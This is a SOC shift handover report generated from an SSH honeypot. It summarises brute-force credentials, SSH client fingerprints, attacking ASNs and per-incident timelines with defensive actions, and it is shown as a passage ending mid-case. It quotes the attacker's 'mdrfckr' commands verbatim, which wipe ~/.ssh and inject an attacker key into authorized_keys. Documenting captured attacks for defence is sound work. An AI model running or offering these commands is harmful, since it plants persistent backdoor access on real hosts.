# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-22 |
| **Generated At** | 2026-08-22T20:28:48Z |
| **Shift Time** | 20:28 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **126** |
| Confirmed Threats | **110** |
| False Positives Filtered | **16** (12.7%) |
| Unique Attacker IPs | **70** |
| Countries of Origin | **30** |
| High Severity Cases | **78** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **48** |
| Malware Samples Analyzed | **2** HIGH · **18** MED · 24 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **94** |
| Unique Credential Pairs | **50** |
| Unique Usernames | **14** |
| Unique Passwords | **49** |
| Successful Auth Pairs | **87** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 20 |
| `debian` | 17 |
| `ubuntu` | 12 |
| `unknown` | 7 |
| `support` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `debian2016` | 6 |
| `debian2008` | 6 |
| `debian2013` | 5 |
| `passwd` | 5 |
| `admin123` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `debian` | `debian2016` | 6 |
| `debian` | `debian2008` | 6 |
| `debian` | `debian2013` | 5 |
| `guest` | `passwd` | 5 |
| `unknown` | `admin123` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `support` | `support` | `10.0.0.73` | 2026-08-22T16:55:09 |
| `ubuntu` | `Cloud@2025` | `217.60.255.130` | 2026-08-22T17:00:01 |
| `root` | `Cloud1403` | `217.60.255.130` | 2026-08-22T17:00:11 |
| `unknown` | `unknown2000` | `121.202.198.98` | 2026-08-22T17:03:18 |
| `unknown` | `unknown2000` | `183.247.171.186` | 2026-08-22T17:03:30 |
| `support` | `support2024` | `85.195.9.20` | 2026-08-22T17:07:23 |
| `support` | `support2024` | `24.238.123.134` | 2026-08-22T17:07:30 |
| `ubuntu` | `asdf@1234` | `217.60.255.130` | 2026-08-22T17:10:01 |
| `root` | `Pass@321` | `120.48.136.241` | 2026-08-22T17:10:09 |
| `root` | `Ali@1362` | `217.60.255.130` | 2026-08-22T17:10:13 |
| `345gs5662d34` | `345gs5662d34` | `120.48.136.241` | 2026-08-22T17:10:16 |
| `debian` | `debian2013` | `65.20.132.230` | 2026-08-22T17:12:23 |
| `debian` | `debian2013` | `65.20.131.63` | 2026-08-22T17:12:34 |
| `debian` | `debian2016` | `10.0.0.73` | 2026-08-22T17:18:46 |
| `root` | `XJ7ZrVGLsn` | `47.96.16.212` | 2026-08-22T17:19:38 |
| `ubuntu` | `Abc123` | `217.60.255.130` | 2026-08-22T17:19:54 |
| `root` | `Mm123456@` | `217.60.255.130` | 2026-08-22T17:20:11 |
| `debian` | `debian2016` | `115.68.133.201` | 2026-08-22T17:20:18 |
| `debian` | `debian2016` | `99.224.131.187` | 2026-08-22T17:20:26 |
| `nobody` | `nobody2005` | `65.20.149.239` | 2026-08-22T17:22:29 |
| `nobody` | `nobody2005` | `93.241.232.14` | 2026-08-22T17:22:36 |
| `nobody` | `nobody2005` | `179.181.133.153` | 2026-08-22T17:22:41 |
| `nobody` | `nobody2005` | `203.252.10.4` | 2026-08-22T17:22:51 |
| `debian` | `debian2013` | `10.0.0.73` | 2026-08-22T17:23:27 |
| `ubuntu` | `andy` | `217.60.255.130` | 2026-08-22T17:29:56 |
| `root` | `Lab@2024` | `217.60.255.130` | 2026-08-22T17:30:15 |
| `support` | `support` | `176.53.159.196` | 2026-08-22T17:34:47 |
| `debian` | `debian2016` | `64.53.7.231` | 2026-08-22T17:35:47 |
| `debian` | `debian2016` | `50.223.176.171` | 2026-08-22T17:35:54 |
| `guest` | `passwd` | `10.0.0.73` | 2026-08-22T17:37:10 |
| `couchdb` | `couchdb` | `57.129.74.123` | 2026-08-22T17:39:35 |
| `345gs5662d34` | `345gs5662d34` | `57.129.74.123` | 2026-08-22T17:39:38 |
| `couchdb` | `3245gs5662d34` | `57.129.74.123` | 2026-08-22T17:39:38 |
| `debian` | `debian2013` | `147.15.110.51` | 2026-08-22T17:39:43 |
| `ubuntu` | `chris` | `217.60.255.130` | 2026-08-22T17:39:49 |
| `debian` | `debian2013` | `178.132.144.161` | 2026-08-22T17:39:50 |
| `root` | `dev1234` | `217.60.255.130` | 2026-08-22T17:40:06 |
| `unknown` | `admin123` | `111.39.206.23` | 2026-08-22T17:44:49 |
| `unknown` | `admin123` | `101.13.1.58` | 2026-08-22T17:45:00 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-22T17:48:15 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-22T17:48:15 |
| `admin` | `admin` | `169.58.161.169` | 2026-08-22T17:48:50 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-22T17:48:51 |
| `ubuntu` | `abc12345` | `217.60.255.130` | 2026-08-22T17:49:45 |
| `root` | `Hh123456` | `217.60.255.130` | 2026-08-22T17:50:09 |
| `test` | `test2019` | `10.0.0.73` | 2026-08-22T17:51:32 |
| `test` | `test2019` | `42.248.129.234` | 2026-08-22T17:52:56 |
| `test` | `test2019` | `115.68.133.201` | 2026-08-22T17:53:05 |
| `guest` | `passwd` | `187.115.144.103` | 2026-08-22T17:54:41 |
| `guest` | `passwd` | `210.0.90.81` | 2026-08-22T17:54:50 |
| `guest` | `passwd` | `182.60.128.241` | 2026-08-22T17:54:57 |
| `unknown` | `admin123` | `10.0.0.73` | 2026-08-22T17:55:52 |
| `ubuntu` | `123456qq` | `217.60.255.130` | 2026-08-22T17:59:43 |
| `root` | `@dmin123` | `217.60.255.130` | 2026-08-22T18:00:09 |
| `admin` | `admin` | `10.0.0.73` | 2026-08-22T18:01:27 |
| `debian` | `debian2008` | `10.0.0.73` | 2026-08-22T18:09:29 |
| `ubuntu` | `Passw0rd!123` | `217.60.255.130` | 2026-08-22T18:09:40 |
| `root` | `It@123` | `217.60.255.130` | 2026-08-22T18:10:09 |
| `unknown` | `admin123` | `194.59.245.3` | 2026-08-22T18:12:10 |
| `unknown` | `admin123` | `208.96.233.67` | 2026-08-22T18:12:17 |
| `ubnt` | `ubnt2015` | `111.70.32.8` | 2026-08-22T18:17:03 |
| `ubnt` | `ubnt2015` | `222.76.248.54` | 2026-08-22T18:17:17 |
| `ubuntu` | `123@123aA` | `217.60.255.130` | 2026-08-22T18:19:34 |
| `root` | `The@123` | `217.60.255.130` | 2026-08-22T18:20:04 |
| `root` | `Abc123456@` | `125.215.52.45` | 2026-08-22T18:26:38 |
| `345gs5662d34` | `345gs5662d34` | `125.215.52.45` | 2026-08-22T18:26:43 |
| `root` | `3245gs5662d34` | `125.215.52.45` | 2026-08-22T18:26:45 |
| `debian` | `debian2008` | `38.224.56.103` | 2026-08-22T18:27:06 |
| `debian` | `debian2008` | `78.187.230.168` | 2026-08-22T18:27:10 |
| `debian` | `debian2008` | `195.222.57.183` | 2026-08-22T18:27:17 |
| `debian` | `debian2008` | `91.92.209.22` | 2026-08-22T18:27:27 |
| `ubnt` | `ubnt2015` | `10.0.0.73` | 2026-08-22T18:28:05 |
| `ubuntu` | `Admin999` | `217.60.255.130` | 2026-08-22T18:29:31 |
| `root` | `Of@123` | `217.60.255.130` | 2026-08-22T18:30:02 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `156.225.1.89` | 2026-08-22T18:33:18 |
| `ubuntu` | `Abc@123456` | `217.60.255.130` | 2026-08-22T18:39:26 |
| `root` | `Abcde@123456` | `217.60.255.130` | 2026-08-22T18:39:53 |
| `admin` | `admin2024` | `195.158.26.59` | 2026-08-22T18:41:41 |
| `config` | `config2003` | `10.0.0.73` | 2026-08-22T18:41:44 |
| `admin` | `admin2024` | `101.13.4.119` | 2026-08-22T18:41:50 |
| `root` | `Pa$$word` | `200.37.103.36` | 2026-08-22T18:46:53 |
| `345gs5662d34` | `345gs5662d34` | `200.37.103.36` | 2026-08-22T18:46:56 |
| `root` | `3245gs5662d34` | `200.37.103.36` | 2026-08-22T18:46:56 |
| `config` | `config1234567` | `223.210.27.53` | 2026-08-22T18:49:11 |
| `ubuntu` | `Data@2023` | `217.60.255.130` | 2026-08-22T18:49:14 |
| `config` | `config1234567` | `124.133.10.66` | 2026-08-22T18:49:19 |
| `root` | `Flash@123` | `217.60.255.130` | 2026-08-22T18:49:50 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **126** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 41 |
| OpenSSH | 35 |
| Go SSH scanner | 3 |
| Paramiko (Python) | 2 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 35 | 34 |
| `419da4c91ddb...` | Modern SSH client | 24 | 1 |
| `f555226df196...` | Mirai/variant | 8 | 3 |
| `af8223ac9914...` | libssh-based | 3 | 1 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 35 | 34 | Mirai/variant |
| `419da4c91ddb...` | libssh | 24 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 8 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 5 | 1 | — |
| `af8223ac9914...` | libssh | 3 | 1 | libssh-based |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 2 | 1 | Mirai/variant |
| `1b8acd46a07d...` | Unknown | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `120.48.136.241`, `57.129.74.123`, `200.37.103.36`, `125.215.52.45`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **70** |
| Unique ASNs | **60** |
| High-Risk ASNs | **51** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 3 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |
| `AS6147` | INTEGRATEL PERÚ S.A.A. | 2 | HIGH |
| `AS18881` | TELEFÔNICA BRASIL S.A | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS24158` | Taiwan Mobile Co., Ltd. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (78)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ae4ace719dc3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 17:00 |
| **Last Seen** | 2026-08-22 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:00:00` | `cowrie.session.connect` |
| `2026-08-22 17:00:00` | `cowrie.client.version` |
| `2026-08-22 17:00:01` | `cowrie.client.kex` |
| `2026-08-22 17:00:01` | `cowrie.login.success` |
| `2026-08-22 17:00:02` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:00:02` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 17:00:02` | `cowrie.direct-tcpip.data` |
| `2026-08-22 17:00:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-113e81b22bd8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 17:00 |
| **Last Seen** | 2026-08-22 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:00:10` | `cowrie.session.connect` |
| `2026-08-22 17:00:10` | `cowrie.client.version` |
| `2026-08-22 17:00:11` | `cowrie.client.kex` |
| `2026-08-22 17:00:11` | `cowrie.login.success` |
| `2026-08-22 17:00:12` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:00:12` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 17:00:12` | `cowrie.direct-tcpip.data` |
| `2026-08-22 17:00:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ac9f04f584b

| Field | Detail |
|---|---|
| **Source IP** | `121.202.198[.]98` |
| **First Seen** | 2026-08-22 17:03 |
| **Last Seen** | 2026-08-22 17:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:03:14` | `cowrie.session.connect` |
| `2026-08-22 17:03:15` | `cowrie.client.version` |
| `2026-08-22 17:03:15` | `cowrie.client.kex` |
| `2026-08-22 17:03:18` | `cowrie.login.success` |
| `2026-08-22 17:03:19` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:03:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.202.198[.]98` to AbuseIPDB if not already reported
- [ ] Block `121.202.198[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42ab7117d816

| Field | Detail |
|---|---|
| **Source IP** | `183.247.171[.]186` |
| **First Seen** | 2026-08-22 17:03 |
| **Last Seen** | 2026-08-22 17:03 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:03:25` | `cowrie.session.connect` |
| `2026-08-22 17:03:26` | `cowrie.client.version` |
| `2026-08-22 17:03:26` | `cowrie.client.kex` |
| `2026-08-22 17:03:30` | `cowrie.login.success` |
| `2026-08-22 17:03:31` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:03:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.247.171[.]186` to AbuseIPDB if not already reported
- [ ] Block `183.247.171[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-176bbd3cd2ff

| Field | Detail |
|---|---|
| **Source IP** | `85.195.9[.]20` |
| **First Seen** | 2026-08-22 17:07 |
| **Last Seen** | 2026-08-22 17:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:07:21` | `cowrie.session.connect` |
| `2026-08-22 17:07:22` | `cowrie.client.version` |
| `2026-08-22 17:07:22` | `cowrie.client.kex` |
| `2026-08-22 17:07:23` | `cowrie.login.success` |
| `2026-08-22 17:07:23` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:07:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.195.9[.]20` to AbuseIPDB if not already reported
- [ ] Block `85.195.9[.]20` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b865fedb0535

| Field | Detail |
|---|---|
| **Source IP** | `24.238.123[.]134` |
| **First Seen** | 2026-08-22 17:07 |
| **Last Seen** | 2026-08-22 17:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:07:28` | `cowrie.session.connect` |
| `2026-08-22 17:07:29` | `cowrie.client.version` |
| `2026-08-22 17:07:29` | `cowrie.client.kex` |
| `2026-08-22 17:07:30` | `cowrie.login.success` |
| `2026-08-22 17:07:30` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:07:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.238.123[.]134` to AbuseIPDB if not already reported
- [ ] Block `24.238.123[.]134` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7a074765ad0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 17:10 |
| **Last Seen** | 2026-08-22 17:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:10:00` | `cowrie.session.connect` |
| `2026-08-22 17:10:00` | `cowrie.client.version` |
| `2026-08-22 17:10:01` | `cowrie.client.kex` |
| `2026-08-22 17:10:01` | `cowrie.login.success` |
| `2026-08-22 17:10:02` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:10:02` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 17:10:02` | `cowrie.direct-tcpip.data` |
| `2026-08-22 17:10:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10a48222995a

| Field | Detail |
|---|---|
| **Source IP** | `120.48.136[.]241` |
| **First Seen** | 2026-08-22 17:10 |
| **Last Seen** | 2026-08-22 17:10 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:10:07` | `cowrie.session.connect` |
| `2026-08-22 17:10:09` | `cowrie.client.version` |
| `2026-08-22 17:10:09` | `cowrie.client.kex` |
| `2026-08-22 17:10:09` | `cowrie.login.success` |
| `2026-08-22 17:10:11` | `cowrie.session.params` |
| `2026-08-22 17:10:11` | `cowrie.command.input` |
| `2026-08-22 17:10:11` | `cowrie.command.failed` |
| `2026-08-22 17:10:12` | `cowrie.log.closed` |
| `2026-08-22 17:10:13` | `cowrie.session.params` |
| `2026-08-22 17:10:13` | `cowrie.command.input` |
| `2026-08-22 17:10:13` | `cowrie.session.file_download` |
| `2026-08-22 17:10:13` | `cowrie.log.closed` |
| `2026-08-22 17:10:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.136[.]241` to AbuseIPDB if not already reported
- [ ] Block `120.48.136[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28011a37906f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 17:10 |
| **Last Seen** | 2026-08-22 17:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:10:12` | `cowrie.session.connect` |
| `2026-08-22 17:10:12` | `cowrie.client.version` |
| `2026-08-22 17:10:12` | `cowrie.client.kex` |
| `2026-08-22 17:10:13` | `cowrie.login.success` |
| `2026-08-22 17:10:13` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:10:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 17:10:14` | `cowrie.direct-tcpip.data` |
| `2026-08-22 17:10:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7728055f5524

| Field | Detail |
|---|---|
| **Source IP** | `120.48.136[.]241` |
| **First Seen** | 2026-08-22 17:10 |
| **Last Seen** | 2026-08-22 17:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:10:13` | `cowrie.session.connect` |
| `2026-08-22 17:10:15` | `cowrie.client.version` |
| `2026-08-22 17:10:15` | `cowrie.client.kex` |
| `2026-08-22 17:10:16` | `cowrie.login.success` |
| `2026-08-22 17:10:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.136[.]241` to AbuseIPDB if not already reported
- [ ] Block `120.48.136[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1db4b7c7af00

| Field | Detail |
|---|---|
| **Source IP** | `65.20.132[.]230` |
| **First Seen** | 2026-08-22 17:12 |
| **Last Seen** | 2026-08-22 17:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:12:21` | `cowrie.session.connect` |
| `2026-08-22 17:12:22` | `cowrie.client.version` |
| `2026-08-22 17:12:22` | `cowrie.client.kex` |
| `2026-08-22 17:12:23` | `cowrie.login.success` |
| `2026-08-22 17:12:23` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:12:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.132[.]230` to AbuseIPDB if not already reported
- [ ] Block `65.20.132[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a11b7d6c2116

| Field | Detail |
|---|---|
| **Source IP** | `65.20.131[.]63` |
| **First Seen** | 2026-08-22 17:12 |
| **Last Seen** | 2026-08-22 17:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:12:32` | `cowrie.session.connect` |
| `2026-08-22 17:12:33` | `cowrie.client.version` |
| `2026-08-22 17:12:33` | `cowrie.client.kex` |
| `2026-08-22 17:12:34` | `cowrie.login.success` |
| `2026-08-22 17:12:34` | `cowrie.direct-tcpip.request` |
| `2026-08-22 17:12:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.131[.]63` to AbuseIPDB if not already reported
- [ ] Block `65.20.131[.]63` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1239119faeaf

| Field | Detail |
|---|---|
| **Source IP** | `47.96.16[.]212` |
| **First Seen** | 2026-08-22 17:19 |
| **Last Seen** | 2026-08-22 17:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:19:36` | `cowrie.session.connect` |
| `2026-08-22 17:19:36` | `cowrie.client.version` |
| `2026-08-22 17:19:36` | `cowrie.client.kex` |
| `2026-08-22 17:19:38` | `cowrie.login.success` |
| `2026-08-22 17:19:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.96.16[.]212` to AbuseIPDB if not already reported
- [ ] Block `47.96.16[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e58d653ace91

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 17:19 |
| **Last Seen** | 2026-08-22 17:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 17:19:53` | `cowrie.session.connect` |
| `2026-08-22 17:19:53` | `cowrie.client.version` |
